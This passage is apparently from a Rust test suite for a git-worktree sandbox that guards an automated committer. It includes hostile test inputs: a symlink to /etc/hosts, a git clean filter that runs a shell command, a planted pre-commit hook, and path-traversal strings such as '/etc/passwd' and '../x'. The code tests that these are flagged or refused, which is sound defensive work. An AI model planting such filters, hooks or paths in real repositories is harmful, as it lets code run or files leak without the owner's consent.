    fn symlinks_and_submodule_entries_get_the_host_execution_badge() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_sl").unwrap();
        std::os::unix::fs::symlink("/etc/hosts", wt.path.join("innocent.txt")).unwrap();
        fs::write(wt.path.join("plain.txt"), "ok").unwrap();
        wt.commit_all("links", "builder").unwrap().unwrap();
        let d = wt.diff(&[]).unwrap();
        let link = d.files.iter().find(|f| f.path == "innocent.txt").unwrap();
        assert_eq!((link.host_exec, link.special), (true, Some("symlink")));
        let plain = d.files.iter().find(|f| f.path == "plain.txt").unwrap();
        assert_eq!((plain.host_exec, plain.special), (false, None));
        assert_eq!(d.files[0].path, "innocent.txt", "flagged entries are listed first");
    }

    #[test]
    fn the_configurable_host_exec_list_extends_the_defaults() {
        let extra = vec!["tools/deploy".to_string(), "*.sh".to_string()];
        assert!(is_host_exec("tools/deploy/run.py", &extra) && is_host_exec("scripts/x.sh", &extra));
        assert!(!is_host_exec("tools/deployment/x", &extra) && !is_host_exec("src/main.rs", &extra));
        for p in ["Makefile", "sub/Makefile", ".envrc", ".gitattributes", ".gitmodules", "rust-toolchain.toml", ".cargo/config.toml", "crates/a/build.rs", ".vscode/tasks.json", ".idea/x.xml"] {
            assert!(is_host_exec(p, &[]), "{}", p);
        }
    }

    #[test]
    fn hooks_in_the_project_never_run_for_daemon_commits() {
        let (_d, p, w) = fx();
        let hook = p.join(".git/hooks/pre-commit");
        let marker = p.parent().unwrap().join("HOOK-RAN");
        fs::write(&hook, format!("#!/bin/sh\ntouch {}\n", marker.display())).unwrap();
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
        let wt = w.create(&p, "t_0004").unwrap();
        fs::write(wt.path.join("x.txt"), "x").unwrap();
        wt.commit_all("c", "builder").unwrap().unwrap();
        assert!(!marker.exists(), "a pre-commit hook ran");
    }

    #[test]
    fn a_project_with_content_filters_or_includes_is_refused() {
        let (_d, p, w) = fx();
        let home = w.scratch_home.clone();
        fs::create_dir_all(&home).unwrap();
        for (k, v) in [("filter.evil.clean", "touch /tmp/x"), ("include.path", "/tmp/evil.cfg")] {
            let mut c = git_command(None, None, &home);
            c.arg("-C").arg(&p).args(["config", "--local", k, v]);
            run(c, "config").unwrap();
        }
        match w.create(&p, "t_0005") {
            Err(GitError::UnsafeConfig(keys)) => assert_eq!(keys, ["filter.evil.clean", "include.path"]),
            other => panic!("{:?}", other),
        }
    }

    fn built(w: &Worktrees, p: &Path, id: &str, file: &str, content: &str) -> (Worktree, String) {
        let wt = w.create(p, id).unwrap();
        fs::write(wt.path.join(file), content).unwrap();
        let sha = wt.commit_all("work", "builder").unwrap().unwrap();
        (wt, sha)
    }

    #[test]
    fn restore_to_base_puts_a_file_back_removes_a_new_one_and_refuses_odd_paths() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_r1").unwrap();
        fs::write(wt.path.join("src/lib.rs"), "pub fn changed() {}\n").unwrap();
        fs::write(wt.path.join("src/new.rs"), "pub fn n() {}\n").unwrap();
        wt.commit_all("work", "builder").unwrap().unwrap();
        assert_eq!(wt.restore_to_base("src/lib.rs").unwrap(), "base");
        assert_eq!(wt.restore_to_base("src/new.rs").unwrap(), "removed");
        assert_eq!(fs::read_to_string(wt.path.join("src/lib.rs")).unwrap(), "pub fn a() {}\n");
        assert!(!wt.path.join("src/new.rs").exists());
        assert!(wt.commit_all("revert", "delphi").unwrap().is_some(), "the restore is a change to commit");
        assert!(wt.diff(&[]).unwrap().files.is_empty(), "nothing differs from the base any more");
        assert_eq!(wt.restore_to_base("src/missing.rs").unwrap(), "removed", "a file that was never there is simply absent");
        for bad in ["", "/etc/passwd", "../x", "src/../../x", ".git/config", "src/.GIT/x", "a//b", "./x"] {
            assert!(wt.restore_to_base(bad).is_err(), "{:?}", bad);
        }
    }

    #[test]
    fn merge_back_merges_an_approved_commit_into_the_operators_branch() {
        let (_d, p, w) = fx();
        let (wt, sha) = built(&w, &p, "t_m1", "src/new.rs", "pub fn n() {}\n");
        match wt.merge_back(&sha, "Merge delphi/t_m1", &[]).unwrap() {
            MergeOutcome::Merged { commit } => assert_ne!(commit, sha, "a --no-ff merge commit"),
            other => panic!("{:?}", other),
        }
        assert_eq!(fs::read_to_string(p.join("src/new.rs")).unwrap(), "pub fn n() {}\n");
    }

    #[test]
    fn merge_back_refuses_a_moved_branch_dirty_overlap_and_detached_heads_without_touching_the_project() {
        let (_d, p, w) = fx();
        let (wt, sha) = built(&w, &p, "t_m2", "src/lib.rs", "pub fn changed() {}\n");
        // The branch moves after approval.
        fs::write(wt.path.join("extra.txt"), "x").unwrap();
        wt.commit_all("more", "builder").unwrap();
        assert!(matches!(wt.merge_back(&sha, "m", &[]).unwrap(), MergeOutcome::Refused(m) if m.contains("moved")));
        let tip = wt.head().unwrap();
        // The operator has uncommitted edits to a file the merge touches.
        fs::write(p.join("src/lib.rs"), "pub fn mine() {}\n").unwrap();
        match wt.merge_back(&tip, "m", &[]).unwrap() {
            MergeOutcome::Refused(m) => assert!(m.contains("uncommitted changes") && m.contains("src/lib.rs"), "{}", m),
            other => panic!("{:?}", other),
        }
        assert_eq!(fs::read_to_string(p.join("src/lib.rs")).unwrap(), "pub fn mine() {}\n", "the operator's edit is untouched");
        // Detached HEAD.
        let mut c = git_command(None, None, &wt.scratch_home);
        c.arg("-C").arg(&p).args(["checkout", "--quiet", "--detach"]).env("GIT_COMMITTER_NAME", "x");
        // (checkout needs a clean tree for the touched file; restore it first)
        let mut r = git_command(None, None, &wt.scratch_home);
        r.arg("-C").arg(&p).args(["checkout", "--quiet", "--", "src/lib.rs"]);
        run(r, "restore").unwrap();
        run(c, "detach").unwrap();
        assert!(matches!(wt.merge_back(&tip, "m", &[]).unwrap(), MergeOutcome::Refused(m) if m.contains("detached")));
    }

    #[test]
    fn a_conflicting_merge_is_aborted_and_leaves_the_project_as_it_was() {
        let (_d, p, w) = fx();
        let (wt, sha) = built(&w, &p, "t_m3", "src/lib.rs", "pub fn theirs() {}\n");
        fs::write(p.join("src/lib.rs"), "pub fn ours() {}\n").unwrap();
        for args in [vec!["add", "--all"], vec!["commit", "--quiet", "-m", "ours"]] {
            let mut c = git_command(None, None, &wt.scratch_home);
            c.arg("-C").arg(&p).args(&args);
            run(c, "ours").unwrap();
        }
        match wt.merge_back(&sha, "m", &[]).unwrap() {
            MergeOutcome::Conflict(files) => assert_eq!(files, ["src/lib.rs"]),
            other => panic!("{:?}", other),
        }
        assert_eq!(fs::read_to_string(p.join("src/lib.rs")).unwrap(), "pub fn ours() {}\n");
        assert!(!p.join(".git/MERGE_HEAD").exists());
    }

    #[test]
    fn removal_leaves_no_branch_or_metadata_in_the_project() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_0006").unwrap();
        wt.remove().unwrap();
        assert!(!wt.path.exists());
        let mut c = git_command(None, None, &wt.scratch_home);
        c.arg("-C").arg(&p).args(["branch", "--list", "delphi/*"]);
        assert_eq!(run(c, "branch").unwrap().trim(), "");
        assert!(!p.join(".git/worktrees/t_0006").exists());
    }

    #[test]
    fn a_non_repository_or_an_empty_one_is_refused() {
        let d = tempfile::tempdir().unwrap();
        let w = Worktrees::new(&d.path().join("wt"));
        assert!(matches!(w.create(d.path(), "t_1"), Err(GitError::NotAGitRepo(_))));
    }
}
